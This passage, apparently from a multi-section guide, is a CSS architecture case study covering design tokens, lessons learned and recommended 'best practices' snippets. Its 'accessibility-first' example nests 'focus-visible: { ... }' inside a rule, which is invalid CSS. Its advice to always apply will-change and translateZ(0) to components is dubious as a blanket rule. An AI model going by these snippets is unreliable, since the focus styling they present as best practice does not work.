**3. Design Tokens vs Hard-coded Values**

```css
/* Decision: Comprehensive design token system */
/* Trade-off: More abstraction but better theming */

:root {
  --color-primary: #3b82f6;
  --color-primary-hover: #2563eb;
}

.button {
  background: var(--color-primary);
}

.button:hover {
  background: var(--color-primary-hover);
}
```

#### Lessons Learned

**Success Factors:**

1. **Incremental Migration**: Gradually migrated components to avoid disruption
2. **Developer Buy-in**: Comprehensive training and documentation
3. **Performance Monitoring**: Real-time performance metrics guided optimizations
4. **Cross-functional Collaboration**: Close work between design and engineering teams

**Challenges Overcome:**

1. **Legacy Code**: Gradual refactoring strategy for existing components
2. **Team Adoption**: Pair programming and code reviews ensured consistency
3. **Performance Budgets**: Strict budgets prevented regression
4. **Browser Compatibility**: Comprehensive testing across supported browsers

**Future Improvements:**

1. **CSS Container Queries**: Implement for more responsive components
2. **CSS Layers**: Better cascade management for complex applications
3. **WebAssembly for CSS**: Explore performance-critical styling operations
4. **AI-assisted Design**: Automated design token generation and optimization

#### Best Practices Established

**1. Performance-First CSS:**

```css
/* Always optimize for performance */
.component {
  contain: layout style paint;
  will-change: transform;
  transform: translateZ(0);
}
```

**2. Accessibility-First Design:**

```css
/* Always include accessibility */
.button {
  min-height: 44px; /* Touch target size */
  focus-visible: {
    outline: 2px solid var(--color-primary);
    outline-offset: 2px;
  }
}

@media (prefers-reduced-motion: reduce) {
  * {
    animation-duration: 0.01ms !important;
    transition-duration: 0.01ms !important;
  }
}
```

**3. Maintainable Architecture:**

```css
/* Clear separation of concerns */
/* tokens/ - Design tokens */
/* base/ - Base styles */
/* components/ - Component styles */
/* utilities/ - Utility classes */
/* themes/ - Theme variations */
```

This case study demonstrates how a systematic approach to CSS architecture can solve complex scalability, performance, and maintainability challenges in production applications. The key success factors were comprehensive planning, incremental implementation, and continuous optimization based on real-world metrics.

---

_Section 12 complete. This real-world case study provides practical insights into implementing CSS architecture at scale, including performance optimization, theming systems, and the technical trade-offs involved in production applications._
